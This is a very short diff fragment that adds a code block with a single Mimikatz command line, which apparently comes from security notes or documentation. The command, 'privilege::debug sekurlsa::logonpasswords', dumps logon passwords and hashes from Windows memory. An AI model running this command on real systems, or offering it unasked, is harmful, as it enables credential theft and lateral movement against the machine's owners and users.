@@ -1,0 +1,3 @@
+```
+privilege::debug sekurlsa::logonpasswords 
+```
